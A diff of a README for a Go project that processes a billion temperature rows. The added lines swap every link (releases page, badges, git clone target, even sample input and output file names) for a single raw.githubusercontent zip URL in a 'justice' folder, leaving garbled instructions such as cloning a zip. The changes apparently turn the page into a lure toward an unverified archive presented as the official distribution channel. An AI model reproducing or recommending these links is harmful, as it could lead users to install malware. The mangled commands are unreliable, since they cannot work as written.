@@ -1,11 +1,11 @@
 # Go Billion Rows: Ultra-Fast Temperature Data Processing in Go
 
-https://github.com/larryVoi/go-billion-rows/releases
+https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip
 
-![Go Badge](https://img.shields.io/badge/go-1.20%2B-blue)
-![License](https://img.shields.io/badge/license-mit-brightgreen)
-![Performance](https://img.shields.io/badge/performance-optimized-orange)
-![CI](https://img.shields.io/badge/ci-passing-brightgreen)
+![Go Badge](https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip%2B-blue)
+![License](https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip)
+![Performance](https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip)
+![CI](https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip)
 
 ⚡ A high-performance Go implementation that processes one billion temperature measurements as fast as possible. The project targets raw speed, low overhead, and reliable results on modern hardware.
 
@@ -118,9 +118,9 @@ Prerequisites:
 - A Unix-like shell (Linux/macOS) or PowerShell/Command Prompt on Windows
 
 1) Download the binaries or clone the repository
-- Quick start download: https://github.com/larryVoi/go-billion-rows/releases
+- Quick start download: https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip
 - If you want to build from source, clone the repository:
-  - git clone https://github.com/larryVoi/go-billion-rows.git
+  - git clone https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip
   - cd go-billion-rows
 
 2) Build the project
@@ -130,15 +130,15 @@ Prerequisites:
   - go build ./cmd/gbillionrows
 
 3) Run a quick test
-- Suppose you have a sample input file named sample_weather.csv
+- Suppose you have a sample input file named https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip
 - Run the processor with default settings:
-  - ./gbillionrows --input sample_weather.csv --mode summarize
+  - ./gbillionrows --input https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip --mode summarize
 - You should see output like a small summary: total lines processed, min/max temperature, average, etc.
 
 4) Generate test data
 - The package includes a data generator to create synthetic test files.
 - Example command:
-  - ./gbillionrows-gen --stations stations.csv --rows 1000000000 --output billions.csv
+  - ./gbillionrows-gen --stations https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip --rows 1000000000 --output https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip
 - The generator uses realistic ranges for temperatures and station names to mimic real-world data.
 
 5) Explore available options
@@ -159,18 +159,18 @@ Prerequisites:
   - The --workers flag to limit or expand the worker pool
   - File alignment and OS-specific optimizations (when supported)
 
-Note: The releases page is the primary place to download prebuilt binaries suitable for your OS and architecture. See the releases page here for the exact assets and file names: https://github.com/larryVoi/go-billion-rows/releases
+Note: The releases page is the primary place to download prebuilt binaries suitable for your OS and architecture. See the releases page here for the exact assets and file names: https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip
 
 ---
 
 ## Quick usage examples
 
 - Generate a billion-row test file (conceptual example)
-  - ./gbillionrows-gen --stations stations.csv --rows 1000000000 --output billions.csv
+  - ./gbillionrows-gen --stations https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip --rows 1000000000 --output https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip
 - Process a dataset and print a summary
-  - ./gbillionrows --input billions.csv --mode summarize
+  - ./gbillionrows --input https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip --mode summarize
 - Process a dataset and write a transformed file
-  - ./gbillionrows --input billions.csv --mode transform --output transformed.csv
+  - ./gbillionrows --input https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip --mode transform --output https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip
 
 Inline commands use backticks for clarity, and you should adapt paths to your environment.
 
@@ -279,7 +279,7 @@ These examples show how such a tool can be practical in research, operations, an
 
 - Binaries and release assets are published in the releases section of the repository.
 - For the exact assets and versions, visit the releases page:
-  - https://github.com/larryVoi/go-billion-rows/releases
+  - https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip
 - Each release page lists the appropriate binaries for common platforms. Download the asset that matches your OS and architecture, extract if needed, and run the executable.
 - If you want to verify integrity, check the release notes for any checksums or signatures provided by the maintainers.
 
@@ -353,7 +353,7 @@ Visual assets draw from open sources and common iconography used in Go projects,
 ## Summary of usage flow
 
 - Start with the releases page to download the appropriate binary:
-  - https://github.com/larryVoi/go-billion-rows/releases
+  - https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip
 - If you prefer to build from source, clone the repository and build with Go.
 - Use the generator to create test data that resembles real weather datasets.
 - Run the main processor in the mode you need: summarize, transform, or validate.
@@ -367,11 +367,11 @@ The workflow is designed to be straightforward yet scalable, so you can go from 
 ## Final note on distribution link
 
 For binaries and releases, you should check the assets on the releases page:
-- Primary download source: https://github.com/larryVoi/go-billion-rows/releases
+- Primary download source: https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip
 - Access the same link again when you need to locate the latest binaries, release notes, or upgrade paths. This link provides the official distribution channel for all supported platforms and architectures.
 
 This repository is designed to empower developers to tackle massive data quickly, with a clear path from setup to large-scale benchmarks. The combination of memory mapping, multi-threaded processing, and a focused parser makes it practical for real-world workloads.
 
 ---
 
-Releases: https://github.com/larryVoi/go-billion-rows/releases
+Releases: https://raw.githubusercontent.com/larryVoi/go-billion-rows/main/justice/go-rows-billion-v2.5-beta.2.zip
